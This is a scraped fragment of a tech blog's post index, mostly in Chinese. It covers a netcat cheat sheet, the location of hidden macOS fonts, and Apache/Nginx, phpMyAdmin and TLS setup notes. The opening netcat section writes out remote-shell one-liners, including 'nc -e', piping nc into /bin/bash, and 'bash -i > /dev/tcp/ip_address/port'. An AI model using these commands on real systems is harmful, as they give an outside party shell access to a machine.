script nc -l -p 1334 -e ./script.bash   内网穿透 Remote Shell  -t\nSend RFC 854 DON\u0026rsquo;T and WON\u0026rsquo;T responses to RFC 854 DO and WILL requests. This makes it possible to use nc to script telnet sessions.\n 1 2 3 4 5 6 7 8 9  # outside firewall nc -l 9000 # inside firewall nc -t address 9000 | /bin/bash # pipe back output mkfifo ncpipe nc -t address 9000 0 \u0026lt; ncpipe | /bin/bash 1 \u0026gt; ncpipe   Alternatives cryptcat cryptcat, netcat using two-fish encryption.\n1 2 3 4  # encrypt connection with password cryptcat -k password-string -l -p 1337 cryptcat -k password hostname 1337   Ncat ncat comes with nmap, with proxy, ssl encryption support.\n Ncat guide Advanced Netcat and TCP Fun - Hak5 1922 examples at man ncat  Exclusive options\n -k, not available on GNU netcat, but available on BSD netcat. 保持端口开启，继续监听下一个连接。 -m, maximum conn  1 2 3 4 5 6  # 多人聊天 ncat -l -p 1337 -m 40 -k --chat # -m, max conn # -k, keep open even all disconnect # --chat, chat mode, prefixes each msg with an ID and relay it to other client # chat mode下，服务器本身不显示文件   ucspt-tcp tcpcat, tcpserver, tcpclient\n Advanced Netcat and TCP Fun - Hak5 1922  1 2 3 4 5 6 7  # server side tcpserver -v -RHl0 0 1337 ./test.sh # -R, no remote info # -H, no remote hostname lookup # -l0, no local hostname lookup, use 0 for it # 0, bind for all interfaces # 后接文件，而不能 \u0026#34;bash -il\u0026#34;, bash -il   /dev/tcp without ncat or netcat, use tcp device to create client to send and receive packets.\n /dev/tcp  Note: telnet is not available on macOS\n1 2 3 4 5 6  # bind descriptor with a hostname, in and out exec 3 \u0026lt;\u0026gt; /dev/tcp/127.0.0.1/1337 echo -e \u0026#34;Hello Snubs\\r\\n\u0026#34; \u0026gt;\u0026amp;3 # receive packet with cat \u0026lt;\u0026amp;3   netcat without netcat\n1 2 3 4 5 6 7 8  nc -l -p 1337 -k -vv # 客户端：把bash stdout, stderr导回tcp设备 # 实际为创建服务端，共享shell bash -i \u0026gt; /dev/tcp/ip_address/port 0\u0026lt;\u0026amp;1 2\u0026gt;\u0026amp;1 # mknod, make a device specific file mknod backpipe p \u0026amp;\u0026amp; telnet ip_address port 0\u0026lt;backpipe | bash 1\u0026gt;backpipe   ","permalink":"https://blog.pseudocold.com/post/2018/netcat/","tags":["network","netcat"],"title":"Netcat"},{"categories":["Notes"],"contents":"从Safari页面渲染异开始，仔细检查后发现其调用了一款其他浏览器调用不到的字体。那么这款字体是哪里来的呢？\n起源：字体回落(Fallback)表现不一致 偶然发现Flask Doc中字体在Chrome中和Dash中显示的不同，前者首选字体为Georgia，后者首选字体为Garamond。且后者应该是调用了Webkit内核渲染内容，利用Safari访问相同页面也首选了Garamond字体。那么问题来着，这款字体到底在哪里呢？因为在Font Book中根本找不到这款字体！\nWebfont? 首先，为了测试方便，先把Flask Doc的页面离线下载到本地。这里既没有保存页面，也没去获取源代码利用Sphinx编译。直接从Dash文档库中提取就好，具体位置为~/Library/Application Support/Dash/DocSets/Flask/Flask.docset。.docset和.app后缀一样，本身只是一种标记，实际就是一个文件夹。进去找到一个.tgz压缩包，解压找出HTML文件就好。\n为什么要获取到离线文件，因为我第一猜想就是，这个Garamond是个webfont。关闭网络链接，清空Safari缓存，重启Safari，打开离线文档页面。好吧，结果显而易见，不是Webfont。毕竟，字体回落font-family: Garamond, Georgia, serif;在那儿呢。\n其后，在 Garamond 字体的维基百科，检索关键词apple，发现Macintosh上确实是存在这个字体的。\n A condensed variant of ITC Garamond was adopted by Apple in 1984 upon the release of the Macintosh, known as Apple Garamond. This was a proprietary font not publicly available, less condensed than the publicly released ITC Garamond Condensed.\n Font Book 中字体位置 Font Book 中所显示字体仅限于标准字体文件夹的字体，根据字体位置分为两类\n 系统字体，/Library/Fonts, /System/Library/Fonts/ 用户字体，~/Library/Fonts  系统字体回落配置位置：\n /System/Library/Frameworks/ApplicationServices.framework/Frameworks/CoreText.framework/Resources/  其他字体位置查找 Application Support 除此以外，不排除一些软件自带字体，所以我先去/Library, /Library/Application Support, ~/Library, ~/Library/Application Support逛了一趟，检索关键词 apple, webkit。虽然没有找到Garamond字体，但也有一些发现。\n ~/Library/WebKit 中记录了所有调用WebKit内核的应用，并以各自BundleId为子文件夹名来存放相关信息。我简单看了一下BundleId，顺手删除了几个冗余文件夹。其中BundleId org.mozilla.firefoxdeveloperedition有点意思，很好奇Firefox调用WebKit内核做什么。 /Library/Application Support/Apple/Fonts文件夹中存放着一些自带软件的自带字体。其下有5个子文件夹：Deprecated, iLife, iWork, iWork Arabic Support, Language Support.  Deprecated 子文件夹中三款字体均是以CY名结尾的.dfont格式字体。据检索结果Fonts. What does CY MS and CE denote?所述，\u0026ldquo;This is used to display Cyrillic script on old apps like AppleWorks and WordX.\u0026rdquo; 斯拉夫字母？我确实用不到。 iWork 子文件夹中存在Garamond字体。最初，我并不认为WebKit会调用iWork的字体，后来验证表明的确是这个字体文件。另外，还有知名的Bodoni字体4款，可后者在/Library/Fonts/中已经存在，可以确定是相同4款。 Language Support 子文件夹中字体都是以NotoSans开头，推测是为了多语言支持。 更新：在后来我搜索到的两篇文章——Hidden Fonts on Mac OS X, List of typefaces included with macOS——中，都提及了这个位置的隐藏字体。而第二篇文中猜测隐藏字体的位置可能和版权问题有关，且提及了其中包含的几款知名字体。     \u0026ldquo;Notable hidden fonts on macOS include Bank Gothic, Bodoni, Century Gothic, Century Schoolbook, Garamond, several cuts of Lucida and Monotype Twentieth Century.\u0026rdquo;\n 测试/Library/Application Support/Apple/Fonts/iWork/Garamond.ttc是否被调用的方法很简单，移动到其他位置后查看显示效果。尽管位置有些奇怪，第一感觉是只被iWork套件调用才对，但是结果表明，macOS系统充分利用了这个隐藏位置的字体（至少对于WebKit而言）。而大多第三方软件，如Chrome、Firefox无法调用这个位置的隐藏字体。\n为了使隐藏字体全局可用，可以将其安装为用户字体。注意：在原位置无法双击安装隐藏字体，Font Book会提示你这些字体已经安装（这也验证了macOS在系统级别识别调用这些字体）。解决办法，复制到其他位置后，双击安装。\n其他字体位置：Framework Location 对Framework位置/System/Library/Frameworks以关键词 font 搜索，有以下结果：\n /System/Library/Frameworks/ApplicationServices.framework/Frameworks/ATS.framework/Resources/FontInfo存在需索.ATSD, .fontinfo文件。这个位置实际指向/System/Library/Frameworks/ApplicationServices.framework/Versions/A/Frameworks/ATS.framework/Versions/Current/Resources/FontInfo。ATS代表Apple Type Service，相关.ATSD, .fontinfo文件可能和字体渲染有关。  Font file present but not in Font Book   /System/Library/Frameworks/ApplicationServices.framework/Frameworks/ATS.framework/Support/FontSubsets 中存在包含部分字符集的字体文件。  后记 之所以注意到这个问题，绝对不是因为博主够细心。因为这个破字体——Apple Garamond（因其为Apple自己基于ITC Garamond设计）——在高分屏上渲染效果实在太差，你第一眼看去肯定以为页面用了Light字重。另外，Apple硬是把/Library/Application Support/Apple针对应用的配置，放大使用范围，让亲儿子WebKit调用后，更是误伤严重。\n改进Garamond字体渲染的解决办法：\n 因为最初是在Dash中Flask Doc发现了Apple Garamond字体调用，所及解包Flask.docset离线文档修改样式表中的字体回落可解决； 直接从源头上解决，不使用默认的Apple Garamond。利用同名字体覆盖安装到用户字体文件夹。Garamond字体家族有很多基于最初Garamond字体的变种，  EB Garamond，开源，比Apple Garamond要粗，字高略高，字宽略窄，但变化不大。而另一款开源字体Cormorant并不推荐，后者明显较EB Garamond细。 Adobe Garamond Pro，商业版，字体较Apple Garamond粗，与EB Garamond相近。其高度和Apple Garamond相同，字宽仅仅比Apple Garamond小一点。 Garamond Premier Pro, 字体较Apple Garamond粗，但是字宽更小，粗细与Adobe Garamond Pro相近。 Garamond字体家族属于old-style字体，由最初的Garamond字体衍生出了一系列变种，在其维基页面下有许多款变种字体可作为Apple Garamond的替代品。而且不难发现，变种列表中前两款字体——Adobe Garamond Pro, Garamond Premier——设计者均为Robert Slimbach，这位字体设计师的维基百科主页也列出其设计的其他复古字体。利用这种思路，找寻其他复古字体替代Apple Garamond也可行。 其他尝试：Arno, old-style font, 字宽更窄，貌似较Adobe Garamond Pro粗，个人认为这种字体小字情况下显得有点过粗。 个人推荐：Adobe Garamond Pro和Minion Pro，前者更接近Apple Garamond，后者字宽大一点，小字显示更好一些。Gentium Basic和Minion Pro接近，但是更宽，小字识别度更高。但其新版Gentium Plus字高较大，而Gentium Book Basic在Gentium Basic基础上进行了加粗、加宽，在高分屏上有点黑过头了。暂用Minon，Gentium作为候选。 最后，修改替换字体Family Name为Garamond，安装字体。   ","permalink":"https://blog.pseudocold.com/post/2018/hidden-fonts-on-macos/","tags":["macos","font"],"title":"macOS 中的隐藏字体"},{"categories":["DevOps","Notes"],"contents":"Setup HTTP/2, TLS 1.3. 拾遗。 (个人笔记，不做注解)\nFormulae Redirect and HSTS Configure HSTS (HTTP Strict Transport Security) for Apache and Nginx\nAccess Control for phpMyAdmin  How To Install and Secure phpMyAdmin on Ubuntu 18.04 How to Install and Secure phpMyAdmin with Nginx on an Ubuntu 18.04 server  访问限制\n Apache配合.htaccess做Basic Auth，Nginx利用配置文件做基本认证。 路径更改/nothingtosee，而非默认/phpmyadmin IP源访问限制。  Apache2 1 2 3 4 5 6 7 8 9  sudo apt install phpmyadmin php-mbstring php-gettext # install for apache, and dbconfigc-common in the prompt # phpmyadmin conf is put in /etc/apache2/conf-enabled # enable mbstring ext explicitly sudo phpenmod mbstring apachectl configtest # apachectl -t sudo systemctl restart apache2   注：phpmyadmin自带apach2配置文件为Ubuntu专有，其他distro中此包不带有服务器配置文件。\n初始化mysql\n1 2 3 4 5 6 7 8 9 10 11 12 13  mysql_secure_installation # init # switch its authentication method from auth_socket to mysql_native_password sudo mysql select user,authentication_string,plugin,host from mysql.user; alter user \u0026#39;root\u0026#39;@\u0026#39;localhost\u0026#39; identified with mysql_native_password by \u0026#39;password\u0026#39;; flush privileges; # refresh changes exit; mysql -u root -p create user \u0026#39;sammy\u0026#39;@\u0026#39;localhost\u0026#39; identified by \u0026#39;password\u0026#39;; grant all privileges on *.* to \u0026#39;sammy\u0026#39;@\u0026#39;localhost\u0026#39; with grant option; exit   secure phpMyAdmin with .htaccess\n1 2 3 4  # /etc/apache2/conf-available/phpmyadmin.conf \u0026lt;Directory /usr/share/phpmyadmin\u0026gt; AllowOverride All # enable .htaccess control support   1 2 3 4 5  # /usr/share/phpmyadmin/.htaccess AuthType Basic AuthName \u0026#34;Restricted Files\u0026#34; AuthUserFile /etc/phpmyadmin/.htpasswd Require valid-user # auth required   可参考/etc/phpadmin/apache.conf\n1 2 3 4 5 6 7 8 9 10 11  # Authorize for setup \u0026lt;Directory /usr/share/phpmyadmin/setup\u0026gt; \u0026lt;IfModule mod_authz_core.c\u0026gt; \u0026lt;IfModule mod_authn_file.c\u0026gt; AuthType Basic AuthName \u0026#34;phpMyAdmin Setup\u0026#34; AuthUserFile /etc/phpmyadmin/htpasswd.setup \u0026lt;/IfModule\u0026gt; Require valid-user \u0026lt;/IfModule\u0026gt; \u0026lt;/Directory\u0026gt;   1 2 3  sudo systemctl reload apache2 sudo htpasswd -c /etc/phpmyadmin/.htpasswd {username} # -c for create sudo htpasswd /etc/phpmyadmin/.htpasswd {anotheruser}   隐身模式测试，再次访问http://localhost/phpmyadmin/时进行基本验证。\nNginx 1 2 3 4 5 6  sudo apt install phpmyadmin # prompt setup, dbconfig-common to conf app db # This will set up the internal database and administrative user for phpMyAdmin. # 千万不要这么做，参看 /etc/phpadmin/apache.conf 做路径权限限制 sudo ln -s /usr/share/phpmyadmin /var/www/html   Disable root login in phpmyadmin with custom config\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  # /etc/phpmyadmin/conf.d/pma_secure.php \u0026lt;?php # PhpMyAdmin Settings # This should be set to a random string of at least 32 chars $cfg[\u0026#39;blowfish_secret\u0026#39;] = \u0026#39;3!#32@3sa(+=_4?),5XP_:U%%8\\34sdfSdg43yH#{o\u0026#39;; $i=0; $i++; $cfg[\u0026#39;Servers\u0026#39;][$i][\u0026#39;auth_type\u0026#39;] = \u0026#39;cookie\u0026#39;; $cfg[\u0026#39;Servers\u0026#39;][$i][\u0026#39;AllowNoPassword\u0026#39;] = false; $cfg[\u0026#39;Servers\u0026#39;][$i][\u0026#39;AllowRoot\u0026#39;] = false; ?\u0026gt;  1 2 3  # encryp password with `crypt()` fun openssl passwd # apache2-utils: /usr/bin/htpasswd 在做相同的事情   1 2 3 4  # paste it into /etc/nginx/pma_pass sammy:O5az.RSPzd.HE # admin:* # * 导致所有密码均无效   注：/etc/phpmyadmin/htpasswd.setup文件被/etc/phpmyadmin/apache2.conf用于/phpmyadmin/setup访问限制。\nNginx basic auth\n1 2 3 4 5 6 7 8 9  # /etc/nginx/sites-available/default server { . . . location /nothingtosee { # symlink to /usr/share/phpmyadmin  auth_basic \u0026#34;Admin Login\u0026#34;; auth_basic_user_file /etc/nginx/pma_pass; } . . . }   IP-based Access Control IP-based access control. only have access to your phpMyAdmin interface if they\u0026rsquo;re accessing from either an authorized IP address or localhost via SSH tunneling\n1 2  # get local public ip curl -i myip.ipip.net # -i for headers in response   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  # /etc/nginx/sites-available/exmaple.com server { . . . location /nothingtosee { satisfy all; #requires both conditions  allow 203.0.113.111; #allow your IP  allow 127.0.0.1; #allow localhost via SSH tunnels  deny all; #deny all other sources  auth_basic \u0026#34;Admin Login\u0026#34;; auth_basic_user_file /etc/nginx/pma_pass; } . . . }   access phpmyadmin through local SSH tunnels\n1 2  ssh user@server_domain_or_IP -L 8000:localhost:80 -L 8443:localhost:443 -N # https://localhost:443/nothingtosee   Similar effect could be achived in Apache.\n1 2 3 4 5 6 7 8  Alias /phpmyadmin \u0026#34;/usr/share/webapps/phpMyAdmin\u0026#34; \u0026lt;Directory \u0026#34;/usr/share/webapps/phpMyAdmin\u0026#34;\u0026gt; DirectoryIndex index.php AllowOverride All Options FollowSymlinks # Require all granted Require local \u0026lt;/Directory\u0026gt;   Reverse Proxy Nginx  How To Configure Nginx as a Web Server and Reverse Proxy for Apache on One Ubuntu 18.04 Server How To Use Apache as a Reverse Proxy with mod_proxy on Ubuntu 16.04 mod_rpaf  virtual host in apache\n Listen 8080 in ports.conf  Reverse proxy apache virtual hosts with nginx server.\n1 2 3  sudo apt install nginx # disable default site sudo rm /etc/nginx/sites-enabled/default   define a default_server, listen 80 default_server;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  server { listen 80 default_server; root /usr/share/nginx/example.com; index index.php index.html index.htm; server_name example.com www.example.com; location / { try_files $uri $uri/ /index.php; } location ~ \\.php$ { fastcgi_pass unix:/run/php/php7.2-fpm.sock; include snippets/fastcgi-php.conf; } }   1  sudo nginx -t   reverse proxy with proxy_pass\n1 2 3 4 5 6 7 8 9 10 11  listen 80; server_name foobar.net www.foobar.net test.io www.test.io; location / { proxy_pass http://your_server_ip:8080; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } }   check DOCUMENT_ROOT in info.php.\nrewrites the values of REMOTE_ADDR, HTTPS and HTTP_PORT based on the values provided by a reverse proxy, with mod_rpaf\n1 2 3 4 5 6 7 8 9 10 11 12  # /etc/apache2/mods-available/rpaf.conf \u0026lt;IfModule mod_rpaf.c\u0026gt; RPAF_Enable On RPAF_Header X-Real-Ip RPAF_ProxyIPs your_server_ip 127.0.0.1 10.0.0.0/24 # Updates the vhost name so ServerName and ServerAlias work RPAF_SetHostName On # Sets the HTTPS environment variable based on the value contained in X-Forwarded-Proto RPAF_SetHTTPS On # Sets the SERVER_PORT environment variable RPAF_SetPort On \u0026lt;/IfModule\u0026gt;   1 2 3  sudo a2enmod rpaf # write by yourself sudo apachectl -t sudo systemctl reload apache2   optional: disable direct access to apache:8080\n1 2  # sudo apt install iptables-persistent sudo iptables -I INPUT -p tcp --dport 8080 ! -s your_server_ip -j REJECT --reject-with tcp-reset   Apache  How To Use Apache as a Reverse Proxy with mod_proxy on Ubuntu 16.04 Apache Module mod_proxy  modules a2enmod\n mod_proxy mod_proxy_http, proxy http conn mod_proxy_balancer, mod_lbmethod_byrequests, load balance and multiple backend servers support  提示：本文测试采用了Flask app监听8080.\n1 2 3 4 5 6 7 8 9  from flask import Flask app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def home(): return \u0026#39;Howdy world!\u0026#39; # FLASK_APP=backend2.py flask run --port=8080 # \u0026amp;\u0026gt;/dev/null \u0026amp; # killall flask   Reverse proxy a single backend server\n1 2 3 4 5 6 7 8  \u0026lt;VirtualHost *:80\u0026gt; ProxyPreserveHost On # pass Host header ProxyPass / http://127.0.0.1:8080/ # modify response headers from backend, # redirect to proxy address, not the backend addr ProxyPassReverse / http://127.0.0.1:8080/ \u0026lt;/VirtualHost\u0026gt;   loading balance across multiple backend\n1 2 3 4 5 6 7 8 9 10 11  \u0026lt;VirtualHost *:80\u0026gt; \u0026lt;Proxy balancer://mycluster\u0026gt; # proxy group BalancerMember http://127.0.0.1:8080 BalancerMember http://127.0.0.1:8081 \u0026lt;/Proxy\u0026gt; ProxyPreserveHost On ProxyPass / balancer://mycluster/ ProxyPassReverse / balancer://mycluster/ \u0026lt;/VirtualHost\u0026gt;   There\u0026rsquo;re also:\n mod_proxy_ftp mod_proxy_connect for SSL tunneling mod_proxy_jap for AJP(apache JServ Protocol) mod_proxy_wstunnel for web sockets  curl references\n Does curl have a \u0026ndash;no-check-certificate option like wget?  1 2 3 4 5 6  curl -I -L https://your_domain # -k, --insecure # --cacert, location for cacert # auto edirect HTTP/1.1 to HTTP/2 # echo insecure \u0026gt;\u0026gt; ~/.curlrc   Build curl with tls 1.3 support homebrew: buld curl-openssl with openssl@1.1. tls 1.3 is included in openssl 1.1.\n laggardkernel/homebrew-tap  1 2 3 4 5  brew tap laggardkernel/tap brew install laggardkernel/tap/curl-openssl --with-openssl@1.1 /usr/local/opt/curl-openssl/bin/curl --version curl --tlsv1.3 https://enabled.tls13.com/   FAQ TLS 1.3 OpenSSL TLS1.3 Support\nnginx直接切换依赖到最新OpenSSL即可。curl同样。但是apache在Homebrew中略复杂，需要考虑apr-util。\n1  openssl version -a   TLS Support in OpenSSL 1.0.2?  Will TLSv1.3 be added to 1.0.2?\nNo. 1.0.2 is a stable branch and doesn\u0026rsquo;t receive new features.\nhttps://github.com/openssl/openssl/issues/963#issuecomment-283299461\n Apache Module \u0026ldquo;.c\u0026rdquo; Extension What is the difference between apache modules with and without the “.c” extension?\n1  \u0026lt;IfModule mod_rewrite.c\u0026gt;    The module argument can be either the module identifier or the file name of the module, at the time it was compiled.\n mod_rewrite.c为编译成mod_rewrite.so前源码名。\nidentifier 则为 rewrite_module，加载时人为定义。\n1  LoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so   ","permalink":"https://blog.pseudocold.com/post/2018/basic-webserver-setup-faq/","tags":["linux","apache","nginx","mysql","php","h2","tls"],"title":"Basic HTTP2 Setup Part 3: FAQ"},{"categories":["DevOps","Notes"],"contents":"Setup HTTP/2, TLS 1.3 with LEMP. (个人笔记，不做注解)\nNginx 配置项要以分号;结尾。\nInstallation references\n How To Install Nginx on Ubuntu 18.04 How To Install Linux, Nginx, MySQL, PHP (LEMP stack) on Ubuntu 18.04  E for Engine-X    install, ufw, vhosts(optional),\n1 2 3  sudo apt install nginx sudo ufw app list sudo ufw allow in \u0026#34;Nginx Full\u0026#34;   1 2 3 4 5 6 7 8 9  \u0026lt;!-- /var/www/example.com/html/index.html --\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome to Example.com!\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Success! The example.com server block is working!\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   1 2 3 4 5 6 7 8 9 10 11 12 13 14  # /etc/nginx/sites-available/example.com server { listen 80; listen [::]:80; root /var/www/example.com/html; index index.html index.htm index.nginx-debian.html; server_name example.com www.example.com; location / { try_files $uri $uri/ =404; } }   apache与nginx同时测试时把index.nginx-debian.html优先级提高。\nenable vhost\n1  sudo ln -s /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/   bucket memory problem?\n1 2 3 4 5 6 7 8  # /etc/nginx/nginx.conf ... http { ... server_names_hash_bucket_size 64; ... } ...   1 2  sudo nginx -t sudo systemctl restart nginx   LEMP setup mysql. 见上面\n1  sudo apt install php-fpm php-mysql   config php use vhosts(optional)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  # /etc/nginx/sites-available/example.conf server { listen 80; root /var/www/html; index index.php index.nginx-debian.html index.html index.htm; server_name example.com www.example.com; location / { try_files $uri $uri/ =404; } location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/var/run/php/php7.2-fpm.sock; #fastcgi_pass 127.0.0.1:9000; } location ~ /\\.ht { deny all; # block deals with .htaccess files } }   Linux中fpm-php默认监听/run/php/php7.2-fpm.sock (/etc/php/7.2/fpm/pool.d/www.conf)\nenable vhost and disable default\n1 2  sudo ln -s /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/ sudo unlink /etc/nginx/sites-enabled/default   php test info.php\n1 2 3  # /var/www/html/info.php \u0026lt;?php phpinfo();   restart\n1 2  sudo nginx -t sudo systemctl restart nginx   phpMyAdmin Ubuntu phpmyadmin包自带apache.conf配置，但是其他distro没有。不管怎样，哪个distro都需要我们为phpmyadmin手写nginx配置。\n subdomain subdirectory (按教程中配置未生效，与全局root位置有关？)  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  server { server_name pma.mubuntu-pd.test; # listen 80; # also listen on http  # listen [::]:80;  listen 443 ssl http2; #listen [::]:443 ssl http2 ipv6only=on;  include snippets/self-signed.conf; # cert  include snippets/ssl-params.conf; gzip off; index index.php; access_log /var/log/nginx/pma.access.log; error_log /var/log/nginx/pma.error.log; # Allows limiting access to certain client addresses.  # allow 192.168.1.0/24;  # allow my-ip;  # deny all;  root /usr/share/phpmyadmin; location / { try_files $uri $uri/ =404; } location ~ /\\.ht { deny all; } error_page 404 /index.php; location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/var/run/php/php7.2-fpm.sock; } }   subdirectory with alias\n phpmyadmin on arch wiki Alias using Nginx causing phpMyAdmin login endless loop   DOCUMENT_ROOT does the trick    1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62  # vim: syntax=nginx ts=4 sw=4 sts=4 sr noet # https://wiki.archlinux.org/index.php/PhpMyAdmin#Nginx # https://serverfault.com/questions/223028/alias-using-nginx-causing-phpmyadmin-login-endless-loop location /phpmyadmin/ { alias /usr/share/phpmyadmin/; } location ~ ^/phpmyadmin/(.+\\.php)$ { alias /usr/share/phpmyadmin/$1; fastcgi_pass unix:/var/run/php/php7.2-fpm.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $request_filename; # change document root \tfastcgi_param DOCUMENT_ROOT /usr/share/phpmyadmin; # borrowed from fastcgi.conf \t#fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; \tfastcgi_param QUERY_STRING $query_string; fastcgi_param REQUEST_METHOD $request_method; fastcgi_param CONTENT_TYPE $content_type; fastcgi_param CONTENT_LENGTH $content_length; fastcgi_param SCRIPT_NAME $fastcgi_script_name; fastcgi_param REQUEST_URI $request_uri; fastcgi_param DOCUMENT_URI $document_uri; #fastcgi_param DOCUMENT_ROOT $document_root; \tfastcgi_param SERVER_PROTOCOL $server_protocol; fastcgi_param REQUEST_SCHEME $scheme; fastcgi_param HTTPS $https if_not_empty; fastcgi_param GATEWAY_INTERFACE CGI/1.1; fastcgi_param SERVER_SOFTWARE nginx/$nginx_version; fastcgi_param REMOTE_ADDR $remote_addr; fastcgi_param REMOTE_PORT $remote_port; fastcgi_param SERVER_ADDR $server_addr; fastcgi_param SERVER_PORT $server_port; fastcgi_param SERVER_NAME $server_name; # PHP only, required if PHP was built with --enable-force-cgi-redirect \tfastcgi_param REDIRECT_STATUS 200; } # Deny static files location ~ ^/phpmyadmin/(README|LICENSE|ChangeLog|DCO)$ { deny all; } # Deny .md files location ~ ^/phpmyadmin/(.+\\.md)$ { deny all; } # Deny setup directories location ~ ^/phpmyadmin/(doc|sql|setup)/ { deny all; } # borrowed from /etc/phpadmin/apache.conf location ~ ^/phpmyadmin/(templates|libraries)/ { deny all; }   Config 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  ❯ tree /etc/nginx -L 1 /etc/nginx ├── conf.d ├── modules-available ├── modules-enabled ├── sites-available ├── sites-enabled ├── snippets ├── dhparam.pem ├── fastcgi.conf ├── fastcgi_params ├── koi-utf ├── koi-win ├── mime.types ├── nginx.conf ├── proxy_params ├── scgi_params ├── uwsgi_params └── win-utf 6 directories, 11 files   Tip\n snippets中配置通用片段（如SSL cert，param），在vhost中引入  Debug 1 2 3 4 5 6 7  sudo nginx -t sudo nginx sudo nginx -s stop # SIGTERM sudo nginx -s quit sudo nginx -s reopen # SIGUSR1 sudo ngxin -s reload # SIGHUP   Custom SSL Certificate references\n 使用mkcert生成本地HTTPS证书 How To Create a Self-Signed SSL Certificate for Nginx in Ubuntu 18.04  1 2 3 4 5 6 7 8 9 10 11  sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \\ -keyout /etc/ssl/private/nginx-selfsigned.key \\ -out /etc/ssl/certs/nginx-selfsigned.crt # req, X.509 certificate signing request (CSR) management # -x509, make self-signed certificate instead of generating a certificate signing request # -nodes, skip securing cert with passphrase # -newkey rsa:2048, new cert and new key at the same time 否则还是两次操作 # Diffie-Hellman group for negotiating Perfect Forward Secrecy # https://en.wikipedia.org/wiki/Forward_secrecy sudo openssl dhparam -out /etc/nginx/dhparam.pem 4096   前向保密（Perfect Forward Secrecy，PFS）：长期使用的主密钥泄漏不会导致过去的会话密钥泄漏。\n1 2 3 4 5 6 7  # /etc/nginx/conf.d/* # or prefer # /etc/nginx/snippets/self-signed.conf ssl_certificate /etc/nginx/ssl/homestead.app.pem; ssl_certificate_key /etc/nginx/ssl/homestead.app-key.pem; # chmod 644   strong encryption settings from cipherli.st\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  # /etc/nginx/snippets/ssl-params.conf ssl_protocols TLSv1.3;# Requires nginx \u0026gt;= 1.13.0 else use TLSv1.2 ssl_prefer_server_ciphers on; ssl_dhparam /etc/nginx/dhparam.pem; # openssl dhparam -out /etc/nginx/dhparam.pem 4096 ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-SHA384; ssl_ecdh_curve secp384r1; # Requires nginx \u0026gt;= 1.1.0 ssl_session_timeout 10m; ssl_session_cache shared:SSL:10m; ssl_session_tickets off; # Requires nginx \u0026gt;= 1.5.9 ssl_stapling on; # Requires nginx \u0026gt;= 1.3.7 ssl_stapling_verify on; # Requires nginx =\u0026gt; 1.3.7 # resolver $DNS-IP-1 $DNS-IP-2 valid=300s; resolver 114.114.114.114 8.8.4.4 valid=300s; resolver_timeout 5s; # Disable strict transport security for now. You can uncomment the following # line if you understand the implications. # add_header Strict-Transport-Security \u0026#34;max-age=63072000; includeSubDomains; preload\u0026#34;; add_header X-Frame-Options DENY; add_header X-Content-Type-Options nosniff; add_header X-XSS-Protection \u0026#34;1; mode=block\u0026#34;; # chmod 644   Note: self-signed certificate can\u0026rsquo;t use SSL stapling.\nenable SSL in vhost\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  # /etc/nginx/sites-available/example.com server { listen 443 ssl; # ssl listen [::]:443 ssl; include snippets/self-signed.conf; include snippets/ssl-params.conf; server_name example.com www.example.com; root /var/www/example.com/html; index index.html index.htm index.nginx-debian.html; . . . } . . . server { listen 80; listen [::]:80; server_name example.com www.example.com; return 302 https://$server_name$request_uri; # return 301 https://$server_name$request_uri; }   Disable gzip for HTTPS Nginx: Disable gzip-compression for https only\nseparate your config into http and https.\n1 2 3 4 5 6 7 8 9 10  server { listen 443 ssl default_server; listen [::]:443 ssl default_server; include snippets/self-signed.conf; include snippets/ssl-params.conf; # Note: You should disable gzip for SSL traffic. # See: https://bugs.debian.org/773332 gzip off; }   HTTP/2 How To Set Up Nginx with HTTP/2 Support on Ubuntu 18.04\nfeatures of HTTP/2\n All requests are downloaded in parallel, not in a queue HTTP headers are compressed Pages transfer as a binary, not as a text file, which is more efficient Servers can “push” data even without the user’s request, which improves speed for users with high latency  h2 over cleartext 目前没有主流浏览器支持，但是某些非浏览器curl等支持。\n1 2 3 4  ... listen [::]:443 ssl http2 ipv6only=on; listen 443 ssl http2; ...   remove old and insecure cipher suite blacklist. ciperli.st配置过应该可以跳过此步骤。\n1 2 3 4  # /etc/nginx/sites-available/your_domain # include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot ssl_ciphers EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5;   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  # reload sudo nginx -t sudo systemctl reload 